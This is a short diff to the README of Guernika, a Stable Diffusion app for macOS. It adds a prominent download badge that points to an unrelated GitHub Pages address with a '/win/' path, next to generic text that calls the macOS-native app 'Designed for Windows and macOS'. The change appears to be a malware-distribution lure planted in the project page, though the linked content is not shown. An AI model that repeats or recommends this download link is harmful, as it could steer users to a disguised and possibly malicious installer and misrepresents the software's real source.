@@ -30,6 +30,12 @@ Guernika is a native macOS interface for Stable Diffusion with support for custo
 
 Whether you're a newcomer or a veteran, Guernika provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Guernika](https://img.shields.io/badge/⬇_DOWNLOAD_Guernika-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
